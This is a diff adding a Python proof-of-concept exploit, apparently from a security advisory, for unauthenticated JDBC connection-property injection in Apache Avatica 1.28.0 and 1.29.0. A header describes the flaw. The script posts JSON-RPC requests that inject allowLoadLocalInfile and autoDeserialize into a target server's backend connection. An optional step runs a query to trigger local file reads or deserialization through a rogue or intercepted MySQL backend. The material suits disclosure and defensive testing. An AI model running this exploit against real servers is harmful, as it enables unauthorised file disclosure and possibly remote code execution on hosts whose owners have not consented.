@@ -1,0 +1,126 @@
+#!/usr/bin/env python
+#
+#
+# Apache Avatica 1.29.0 JDBC Connection Property Injection
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://calcite.apache.org/avatica
+# Affected version: 1.29.0 and 1.28.0
+#
+# Summary: Avatica is a framework for building database drivers. Avatica
+# is defined by a wire API between a client and a server. The Avatica server
+# is an HTTP server, the Avatica client is a JDBC driver, and the wire API
+# is defined by JSON or Protobuf Buffers. The flexibility of the wire API
+# and HTTP transport allows other Avatica clients to be built in any language,
+# implementing any client specification. Avatica is a sub-project of the Apache
+# Calcite project.
+#
+# Desc: Apache Calcite Avatica (avatica-server) copies client-supplied JDBC
+# connection properties into the backend connection with no filtering by default
+# (JdbcMeta.openConnection: fullInfo.putAll(info) then DriverManager.getConnection),
+# and authentication is disabled by default, so an unauthenticated remote client
+# can inject driver properties such as allowLoadLocalInfile or autoDeserialize.
+#
+# The backend JDBC URL itself is fixed by the operator, so the injected properties
+# only produce impact against a backend that is attacker-controlled or reachable
+# via man-in-the-middle: in that case allowLoadLocalInfile can make the backend read
+# local files from the Avatica host (disclosure), and autoDeserialize can cause deserialization
+# of attacker data, which becomes remote code execution only when a suitable gadget
+# is present on the backend classpath.
+#
+# Tested on: Eclipse Temurin OpenJDK 21.0.6 (LTS)
+#            avatica-server 1.28.0
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6013
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6013
+#
+#
+# 13.08.2026
+#
+
+
+import sys
+import json
+import uuid
+import argparse
+import urllib.error
+import urllib.request
+
+r"""
+Usage:
+    python avatica.py http://TARGET:8765/
+    python avatica.py http://TARGET:8765/ --actuate --sql "SELECT 1"
+"""
+
+PROPS = {"allowLoadLocalInfile"  : "true", 
+         "allowUrlInLocalInfile" : "true",
+         "autoDeserialize"       : "true"}
+
+def rpc(url, obj):
+    body = json.dumps(obj).encode()
+    req = urllib.request.Request(url, data=body, method="POST",
+                                 headers={"Content-Type": "application/json"})
+    try:
+        with urllib.request.urlopen(req, timeout=29) as r:
+            return r.status, r.read().decode("utf-8", "replace")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode("utf-8", "replace")
+    except Exception as e:
+        return None, f"__ERR__ {e}"
+
+def main():
+    ap = argparse.ArgumentParser(description="Avatica unauth connection-property injection")
+    ap.add_argument("target", help="Avatica server URL, e.g. http://10.2.5.1:8765/")
+    ap.add_argument("--actuate", action="store_true", help="also run a query so the backend connection is used")
+    ap.add_argument("--sql", default="SELECT 1", help="query for --actuate (default: SELECT 1)")
+    a = ap.parse_args()
+
+    cid = str(uuid.uuid4())
+    open_req = {"request": "openConnection", "connectionId": cid, "info": PROPS}
+    print(f"[*] POST {a.target}  (unauthenticated)")
+    print(f"[*] OpenConnectionRequest info = {json.dumps(PROPS)}")
+    status, body = rpc(a.target, open_req)
+    print(f"[*] HTTP {status}\n    {body}\n")
+
+    if status == 401 or (body and '"response"' in body and '"error"' in body and 'auth' in body.lower()):
+        print("[-] Looks auth-gated or errored - the server may have authentication enabled, or uses protobuf"
+              " serialization. Injection not possible.")
+        sys.exit(1)
+    if not (body and 'openConnection' in body):
+        print("[-] Did not get an openConnection response (protobuf-only server, or different path). "
+              "Point --target at the JSON Avatica endpoint.")
+        sys.exit(1)
+
+    print("[+] Unauthenticated client-supplied connection properties were accepted into the server's backend")
+    print("    connection (allowLoadLocalInfile / allowUrlInLocalInfile / autoDeserialize). Injection confirmed.")
+
+    if a.actuate:
+        st = {"request": "createStatement", "connectionId": cid}
+        s_status, s_body = rpc(a.target, st)
+        print(f"\n[*] createStatement -> HTTP {s_status}\n    {s_body}")
+        sid = None
+        try:
+            sid = json.loads(s_body).get("statementId")
+        except Exception:
+            pass
+        if sid is not None:
+            pe = {"request"      : "prepareAndExecute",
+                  "connectionId" : cid,
+                  "statementId"  : sid,
+                  "sql"          : a.sql,
+                  "maxRowCount"  : -1}
+            e_status, e_body = rpc(a.target, pe)
+            print(f"\n[*] prepareAndExecute {a.sql!r} -> HTTP {e_status}\n    {e_body}")
+            print("\n[*] If the server's backend is a MySQL-family driver and you are serving the rogue/MITM")
+            print("    MySQL it connects to, this query triggers the LOAD DATA LOCAL INFILE file read / deser.")
+
+    rpc(a.target, {"request": "closeConnection", "connectionId": cid})  # cleanup
+
+if __name__ == "__main__":
+    main()
